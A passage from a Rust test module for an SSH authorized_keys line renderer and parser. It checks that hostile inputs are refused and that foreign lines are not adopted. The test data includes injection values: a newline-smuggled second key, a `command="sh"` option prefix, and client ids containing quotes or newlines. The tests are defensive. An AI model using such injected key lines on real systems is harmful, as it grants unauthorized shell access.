        let key = format!("ssh-ed25519 {KEY} whatever they/typed");
        let line = render(&key, "MacBook Air", "mac-1", Scope::HostAdmin, Grant::Shell, None)
            .expect("render");
        assert!(!line.contains("they/typed"), "their comment survived: {line}");
        // Their comment is where the device id goes, so a comment carried
        // through verbatim would also be a way to claim another device's id.
        assert_eq!(line.matches('.').count(), 1, "more than one delimiter: {line}");
    }

    /// Every refusal a restricted line makes, a plain line makes too.
    ///
    /// The point of rendering both through one function: a plain line must not
    /// become a way to smuggle bytes that a restricted line refuses.
    #[test]
    fn hostile_key_bytes_are_refused_for_a_plain_line_exactly_as_for_a_restricted_one() {
        let admin = Scope::HostAdmin;
        let smuggled = format!("ssh-ed25519 {KEY} ok\nssh-ed25519 {OTHER_KEY} them");
        assert!(matches!(
            render(&smuggled, "mac", "mac-1", admin, Grant::Shell, None),
            Err(Rejected::MultiLine)
        ));
        let with_options = format!("command=\"sh\" ssh-ed25519 {KEY} x");
        assert!(render(&with_options, "mac", "mac-1", admin, Grant::Shell, None).is_err());
        assert!(matches!(
            render(RSA, "mac", "mac-1", admin, Grant::Shell, None),
            Err(Rejected::Algorithm)
        ));
        assert!(matches!(
            render("not a key at all", "mac", "mac-1", admin, Grant::Shell, None),
            Err(Rejected::Unparseable)
        ));

        // The id lands in the comment, which runs to the end of the line, so an
        // id with a space in it is a second entry's worth of text — and an id
        // that could close a quote is refused here too even though this line
        // has no quotes, because one charset for both shapes is the only way
        // neither drifts.
        let key = format!("ssh-ed25519 {KEY} x");
        for hostile in ["", "mac 1", "mac\"1", &format!("mac\nssh-ed25519 {OTHER_KEY} them")] {
            assert!(
                matches!(
                    render(&key, "mac", hostile, admin, Grant::Shell, None),
                    Err(Rejected::ClientId)
                ),
                "a hostile client id was accepted for a plain line: {hostile:?}"
            );
        }
    }

    /// A plain line is host_admin or nothing.
    ///
    /// An unrestricted line IS a shell, and a shell on this account is every
    /// power the account has — so a request that asks for one while saying
    /// `read` or `control` is incoherent, and the coherent reading of it is a
    /// mistake. The caller's own scope is checked in `rpc`; this is the request
    /// agreeing with itself.
    #[test]
    fn a_plain_line_below_host_admin_is_refused() {
        let key = format!("ssh-ed25519 {KEY} x");
        for scope in [Scope::Read, Scope::Control, Scope::Unspecified] {
            assert!(
                matches!(
                    render(&key, "mac", "mac-1", scope, Grant::Shell, None),
                    Err(Rejected::ShellScope)
                ),
                "a plain line was rendered at {scope:?}"
            );
        }
    }

    /// A plain line whose comment we could not have written is still foreign.
    ///
    /// The comment is what says a plain line is managed, so the shape of it is
    /// load-bearing: an id that `render` would have refused is an id `render`
    /// did not write, and adopting it would put a stranger's line inside the
    /// set that `revoke` deletes.
    #[test]
    fn a_plain_line_whose_comment_we_could_not_have_written_stays_foreign() {
        for comment in [
            "someone@laptop",
            "farcooler-shell-mac-aaaaaaaa",   // no device at all
            "farcooler-shell-mac-aaaaaaaa.",  // a device that is empty
            "farcooler-mac-aaaaaaaa.mac-1",   // not the shell prefix
            "shell-mac-aaaaaaaa.mac-1",
        ] {
            let text = format!("{BEGIN}\nssh-ed25519 {OTHER_KEY} {comment}\n{END}\n");
            let entries = parse(&text).expect("parse");
            assert_eq!(entries.len(), 1);
            assert!(
                entries[0].client_id.is_empty() && !entries[0].shell_access,
                "{comment} was adopted as ours"
            );
        }
    }
}
